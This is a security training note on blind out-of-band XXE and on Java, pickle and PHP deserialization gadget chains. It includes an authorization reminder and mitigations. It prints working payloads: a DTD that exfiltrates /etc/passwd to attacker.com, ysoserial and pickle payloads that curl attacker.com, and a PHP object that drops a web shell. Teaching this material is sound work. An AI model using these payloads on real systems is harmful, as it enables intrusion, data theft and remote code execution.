### Blind OOB XXE and Deserialization Gadget Chains

--> LEGAL/ETHICAL REMINDER: everything below is for authorized environments only — your own lab (a local vulnerable app, DVWA/Juice Shop, a deliberately vulnerable Docker target like `WebGoat` or a `ysoserial` test harness) or engagements with signed written permission. Crafting deserialization payloads that call `Runtime.exec`/`os.system` against a system you don't have authorization for is unauthorized computer access, full stop.

--> This note assumes you already understand the introductory XXE and insecure deserialization sections in note 04 — basic in-band XXE (where the parsed entity's content is reflected straight back in the response) and the general concept that deserializing untrusted data is dangerous. This note covers what you actually have to do when there's no direct response to read, and how deserialization exploitation really works under the hood rather than just "craft malicious serialized data."

## Why Blind/OOB XXE Is the Realistic Case

--> Note 04's XXE example works because the vulnerable app reflects `&xxe;`'s resolved content back into the HTTP response — you see `/etc/passwd` right there in the page. In real-world targets this is rare: the XML is often parsed purely for internal processing (an import job, a SOAP backend call) and nothing about the entity's resolved value ever appears in anything you can read. That's blind XXE, and it requires an Out-of-Band (OOB) exfiltration channel instead of relying on the response body.

--> The core idea: instead of trying to get file content back IN the response, get the vulnerable parser to make an OUTBOUND request (typically HTTP, sometimes FTP) to a server you control, with the file's content smuggled into that outbound request. You read the file by reading YOUR server's access log, not the target's response.

## Stage 1 — Prove Basic OOB Interaction

--> Before attempting exfiltration, confirm the parser will actually fetch an external resource at all (this doubles as an SSRF-style capability check) — point an external entity at a URL on an attacker-controlled listener and watch for the callback.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/oob-test"> ]>
<userInfo><name>&xxe;</name></userInfo>
```

```bash
# Attacker-side: a simple listener to confirm the callback arrived
python3 -m http.server 80
# or use Burp Collaborator / interactsh for a hosted OOB listener that also handles DNS/HTTP
```

--> If `attacker.com/oob-test` gets hit, the parser resolves external entities and makes outbound requests — blind exploitation is viable. If nothing arrives, check whether outbound HTTP is firewalled (fall back options below) or whether DTD processing is disabled entirely.

## Stage 2 — Exfiltrate File Content via a Malicious External DTD

--> The real-world constraint: you generally CANNOT put a file's raw content directly into a URL or attribute value in a single entity definition, because XML entity resolution happens in a specific order and a file's content often contains characters (newlines, `&`, `<`) that break a URL or attribute outright. The workaround is a two-file, parameter-entity technique that builds the exfiltration URL out of the file's content as a separate resolution step, hosted on YOUR server as an external DTD.

--> `evil.dtd` (hosted on the attacker's server) — defines a parameter entity that reads the target file, then a second parameter entity that builds an outbound request embedding that content:

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

--> The victim-submitted XML that pulls this DTD in and triggers the chain:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<userInfo><name>&exfil;</name></userInfo>
```

--> Why this needs two stages: parameter entities (`%file;`, `%eval;`) are resolved as the DTD is being PARSED, before the general entity (`&exfil;`) is ever referenced in the document body. That ordering lets `%eval;` build a brand-new entity definition (`exfil`) whose SYSTEM identifier already has `%file;`'s resolved content baked into the URL, by the time `&exfil;` gets referenced. Trying to do this in one flat entity definition fails because you can't reference an unresolved parameter entity inside the same declaration that defines it in most parsers, and you can't put raw file bytes straight into a URL — this indirection is the workaround.

--> Attacker's web server access log now shows the (URL-encoded, since most content needs escaping) contents of `/etc/passwd` in the querystring of the inbound request — that's the exfiltrated data, read out-of-band instead of from the app's own response.

--> Fallback when straightforward outbound HTTP is blocked by egress firewalling: some environments still allow outbound FTP, so entities can be built against `ftp://attacker.com/...` instead; where even that's blocked, error-based XXE (deliberately causing an XML parsing error whose error MESSAGE echoes back partial file content, e.g. via a malformed DOCTYPE with an intentionally invalid SYSTEM reference) is the last-resort technique — it leaks the file a fragment at a time through parser error text rather than a full OOB round-trip.

--> Detection/mitigation (same core fix as note 04): disable DTD processing / external entity resolution entirely in the XML parser config — this kills both in-band and blind/OOB XXE at the source, since none of the above works if the parser refuses to even load an external DTD.

## Deserialization Gadget Chains — Beyond "Craft Malicious Serialized Data"

--> Note 04 covers the concept (deserializing untrusted data lets an attacker manipulate application state or trigger code execution). What it doesn't cover is HOW code execution actually gets triggered when the attacker can't upload a custom malicious class — because in most real Java/PHP targets, they can't. The attacker is stuck using classes ALREADY PRESENT on the target's classpath/codebase. Gadget chains are how that limitation is worked around.

### Java — ysoserial and Gadget Chains

--> Java's `ObjectInputStream.readObject()` automatically invokes certain methods on the objects being reconstructed (`readObject` itself if the class defines a custom one, and objects placed in structures like `HashMap`/`HashSet` trigger `hashCode()`/`equals()` calls during their own reconstruction). None of these methods are inherently dangerous by themselves — they're ordinary, benign methods that exist for entirely legitimate reasons in libraries like Apache Commons-Collections or Spring.

--> A "gadget chain" is a pre-discovered SEQUENCE of these ordinary method calls across several ordinary classes that, purely by the accident of what each class's method happens to do with its fields, chains together step by step until it reaches a dangerous sink — typically something equivalent to `Runtime.exec()`. `ysoserial` is a tool that has these chains pre-built for common libraries (`CommonsCollections1` through `CommonsCollections11`, `Spring1`, `Groovy1`, etc.) — you tell it which chain and what command to run, and it emits a ready-to-send serialized byte stream.

```bash
# ysoserial generates a serialized payload using the CommonsCollections6 gadget chain,
# which will execute the given command WHEN the target application deserializes it
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.bin

# Send payload.bin wherever the app deserializes untrusted input (a cookie, a request body, a file upload)
```

--> The critical point: NO custom malicious class is ever uploaded to the target. Every class involved (`InvokerTransformer`, `LazyMap`, `AnnotationInvocationHandler`, etc.) already ships as part of Commons-Collections or the JDK itself, sitting harmlessly on the classpath for its normal legitimate purpose. The vulnerability is entirely in which LIBRARY VERSIONS happen to be present — if the vulnerable version of Commons-Collections isn't on the classpath, that specific gadget chain simply doesn't exist to abuse, which is why `ysoserial` ships a dozen+ different chains for different library combinations.

### Python `pickle` — No Gadget Hunting Required At All

--> Python's `pickle` module is a fundamentally different, and simpler, problem: any object can define a `__reduce__` method that tells `pickle` exactly what callable to invoke, with what arguments, to reconstruct that object. `pickle.loads()` on untrusted data honors whatever `__reduce__` says — there's no chain of coincidental method calls needed, because the attacker gets to specify the callable DIRECTLY.

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        # __reduce__ returns (callable, args) - pickle will call callable(*args)
        # during unpickling. No gadget chain needed - os.system is called directly.
        return (os.system, ('curl http://attacker.com/pwned',))

payload = pickle.dumps(Exploit())
# Anywhere pickle.loads(payload) runs on this data, os.system() executes immediately
```

--> This is why `pickle` documentation explicitly warns never to unpickle data from an untrusted source — unlike Java, there's no library-version dependency or gadget discovery step at all; the mechanism is a designed, generic hook, not an accidental side effect of unrelated code.

### PHP POP (Property-Oriented Programming) Chains

--> PHP's `unserialize()` automatically invokes certain "magic methods" on the reconstructed object with NO explicit call needed: `__wakeup()` runs immediately after an object is unserialized (meant for re-establishing resources like DB connections), `__destruct()` runs when the object is garbage-collected (often at script end), and `__toString()` runs whenever the object is used in a string context.

--> A POP chain works like this: if ANY class reachable via autoloading in the target codebase has one of these magic methods doing something dangerous with an object property (e.g. `__destruct()` calling `file_put_contents($this->filename, $this->content)`, or passing a property into `call_user_func()`), an attacker who controls the serialized data controls THAT PROPERTY'S value — so `unserialize()` on attacker-supplied data can set up the object exactly so its automatic magic-method call does something the developer never intended, purely through property values, no method redefinition needed (hence "property-oriented" rather than "code injection").

```text
# Conceptual PHP POP payload shape - an attacker-crafted serialized object
# targeting a real class already present in the app (e.g. a framework's log/cache class)
# whose __destruct() writes $this->file with $this->data - attacker sets both via serialization
O:12:"VulnLogClass":2:{s:4:"file";s:11:"shell.php";s:4:"data";s:20:"<?php system($_GET[c]);?>";}
```

--> `PHPGGC` (PHP Generic Gadget Chains) is the PHP-ecosystem equivalent of `ysoserial` — a library of pre-built POP chains against common frameworks (Laravel, Symfony, Monolog, Guzzle) that generates ready-to-send serialized payloads the same way `ysoserial` does for Java.

```bash
# PHPGGC - list available gadget chains for known frameworks, then generate one
phpggc -l
phpggc Monolog/RCE1 system 'id' -o payload.txt
```

--> Detection/mitigation (all three ecosystems): never deserialize untrusted input directly — use data formats without automatic-execution semantics (JSON) wherever the data doesn't need to be a language-native object; if native serialization is unavoidable, use integrity checks (HMAC-signed serialized blobs) so tampered data is rejected before deserialization even happens, keep libraries patched (most public gadget chains target specific vulnerable library versions), and for Java specifically, consider look-ahead deserialization filters (`ObjectInputFilter`, introduced to allow-list which classes may be deserialized at all).

## Comparison Table

| | Java | Python `pickle` | PHP `unserialize` |
|---|---|---|---|
| What auto-invokes | `readObject`, plus incidental `hashCode`/`equals` during collection reconstruction | Whatever `__reduce__` specifies — designed, generic hook | Magic methods: `__wakeup`, `__destruct`, `__toString` |
| Needs a "gadget chain" of coincidental calls? | Yes — chains classes already on the classpath | No — attacker specifies the callable directly | Yes — needs a class with a dangerous magic method reachable via autoload |
| Pre-built gadget-finder tool | `ysoserial` | Not needed (direct `__reduce__` control) | `PHPGGC` |
| Typical real-world entry point | A serialized object in a cookie/RMI/JMX endpoint | An app caching/passing objects via `pickle` (ML model files, session stores) | A serialized object in a cookie or cache value, often framework-supplied classes |

--> Both blind XXE and gadget-chain deserialization are instances of the same underlying category as note 38's SSTI — a format that looks inert (XML, a serialized blob, a template string) but has a full interpreter hiding underneath it, and the attacker's job is finding the path from "data the app trusted" to "code the app's own trusted machinery will execute for you." With OOB exfiltration and gadget-chain mechanics understood, revisit note 04's XXE/deserialization sections as the "detect it exists" layer this note builds the "actually exploit it blind/without a custom payload class" layer on top of.
